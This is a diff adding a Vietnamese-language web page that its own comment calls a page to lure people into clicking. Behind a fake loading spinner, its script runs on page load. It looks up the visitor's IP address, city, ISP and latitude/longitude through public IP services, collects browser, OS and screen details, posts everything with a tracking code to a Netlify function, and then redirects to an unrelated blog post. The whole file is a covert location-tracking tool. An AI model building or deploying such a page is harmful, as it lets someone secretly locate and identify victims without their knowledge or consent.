@@ -1,1 +1,174 @@
+<!-- index.html - Trang chính để dụ người bấm -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        *{user-select:none;margin:0;padding:0;box-sizing:border-box}
+        body{height:100vh;background:#0a0a1a;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;overflow:hidden}
+        .loader-container{text-align:center;padding:40px;background:rgba(255,255,255,0.03);border-radius:20px;border:1px solid rgba(255,255,255,0.05);backdrop-filter:blur(10px);box-shadow:0 30px 60px rgba(0,0,0,0.5);min-width:300px}
+        .spinner{width:60px;height:60px;margin:0 auto 25px;border:3px solid rgba(255,255,255,0.05);border-radius:50%;border-top:3px solid #00d4ff;border-right:3px solid #ff6b6b;animation:spin .8s cubic-bezier(.76,.35,.2,.7)infinite;position:relative}
+        .spinner::before{content:'';position:absolute;top:5px;left:5px;right:5px;bottom:5px;border-radius:50%;border:3px solid rgba(255,255,255,0.03);border-bottom:3px solid #ffd93d;animation:spin 1.2s cubic-bezier(.76,.35,.2,.7)infinite reverse}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .loader-title{color:#fff;font-size:20px;font-weight:600;margin-bottom:8px;letter-spacing:.5px}
+        .loader-sub{color:rgba(255,255,255,0.4);font-size:13px;letter-spacing:1px;font-weight:300}
+        .progress{width:200px;height:2px;background:rgba(255,255,255,0.05);border-radius:10px;margin:20px auto 0;overflow:hidden}
+        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#00d4ff,#ff6b6b,#ffd93d);border-radius:10px;animation:progress 1.2s ease-in-out forwards}
+        @keyframes progress{0%{width:0%}100%{width:100%}}
+        .status-text{color:rgba(255,255,255,0.3);font-size:11px;margin-top:15px;letter-spacing:.5px}
+        .honeypot{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+    </style>
+</head>
+<body>
+    <div class="honeypot" id="honeypot" onclick="void(0)"></div>
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <div class="loader-title">Đang xử lý <span id="dots">...</span></div>
+        <div class="loader-sub">Vui lòng đợi trong giây lát</div>
+        <div class="progress"><div class="progress-bar"></div></div>
+        <div class="status-text" id="status">Đang kết nối...</div>
+    </div>
 
+    <script>
+        // ===== LẤY CODE TỪ URL =====
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code') || urlParams.get('ref') || 'unknown';
+        
+        // ===== LẤY IP =====
+        async function getIPInfo() {
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+            
+            for (let api of apis) {
+                try {
+                    const r = await fetch(api, {headers:{'Accept':'application/json'}});
+                    if (!r.ok) continue;
+                    const d = await r.json();
+                    
+                    if (api.includes('ipapi.co')) {
+                        return {
+                            ip: d.ip || '0.0.0.0',
+                            country: d.country_name || 'Không xác định',
+                            country_code: d.country_code || 'N/A',
+                            city: d.city || 'Không xác định',
+                            region: d.region || 'Không xác định',
+                            isp: d.org || 'Không xác định',
+                            latitude: d.latitude || 0,
+                            longitude: d.longitude || 0,
+                            timezone: d.timezone || 'Asia/Ho_Chi_Minh'
+                        };
+                    } else if (api.includes('ipinfo.io')) {
+                        const [lat, lon] = (d.loc || '0,0').split(',');
+                        return {
+                            ip: d.ip || '0.0.0.0',
+                            country: d.country || 'Không xác định',
+                            country_code: d.country || 'N/A',
+                            city: d.city || 'Không xác định',
+                            region: d.region || 'Không xác định',
+                            isp: d.org || 'Không xác định',
+                            latitude: parseFloat(lat) || 0,
+                            longitude: parseFloat(lon) || 0,
+                            timezone: d.timezone || 'Asia/Ho_Chi_Minh'
+                        };
+                    }
+                } catch(e) { continue; }
+            }
+            return {
+                ip: '0.0.0.0',
+                country: 'Không xác định',
+                country_code: 'N/A',
+                city: 'Không xác định',
+                region: 'Không xác định',
+                isp: 'Không xác định',
+                latitude: 0,
+                longitude: 0,
+                timezone: 'Asia/Ho_Chi_Minh'
+            };
+        }
+
+        // ===== GỬI DỮ LIỆU VỀ BOT =====
+        async function sendData() {
+            const statusEl = document.getElementById('status');
+            
+            try {
+                statusEl.textContent = 'Đang thu thập thông tin...';
+                
+                const info = await getIPInfo();
+                const now = new Date();
+                const timeStr = now.toLocaleString('vi-VN', {
+                    timeZone: info.timezone || 'Asia/Ho_Chi_Minh',
+                    weekday: 'long',
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                const deviceInfo = {
+                    os: navigator.platform || 'Unknown OS',
+                    browser: navigator.userAgent || 'Unknown',
+                    language: navigator.language || 'vi-VN',
+                    screen: `${window.screen.width}x${window.screen.height}`
+                };
+
+                const data = {
+                    code: code,
+                    ip: info.ip,
+                    country: info.country,
+                    country_code: info.country_code,
+                    city: info.city,
+                    region: info.region,
+                    isp: info.isp,
+                    latitude: info.latitude,
+                    longitude: info.longitude,
+                    timezone: info.timezone,
+                    os: deviceInfo.os,
+                    browser: deviceInfo.browser,
+                    language: deviceInfo.language,
+                    screen: deviceInfo.screen,
+                    time: timeStr,
+                    timestamp: now.getTime(),
+                    referrer: document.referrer || 'Direct',
+                    map: `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
+                };
+
+                statusEl.textContent = 'Đang gửi dữ liệu...';
+
+                // Gửi về Netlify Function
+                const response = await fetch('/.netlify/functions/track', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    statusEl.textContent = '✓ Đã ghi nhận!';
+                } else {
+                    statusEl.textContent = '⚠️ Lỗi gửi dữ liệu';
+                }
+
+                // Chuyển hướng sau 1s
+                setTimeout(() => {
+                    window.location.replace('https://gunshop.vn/blogs/chia-se-tu-van/nhung-dieu-thu-vi-ve-dau-khac-duong-vat');
+                }, 1000);
+
+            } catch(e) {
+                statusEl.textContent = '⚠️ Lỗi, chuyển hướng...';
+                setTimeout(() => {
+                    window.location.replace('https://gunshop.vn/blogs/chia-se-tu-van/nhung-dieu-thu-vi-ve-dau-khac-duong-vat');
+                }, 800);
+            }
+        }
+
+        sendData();
+    </script>
+</body>
+</html>
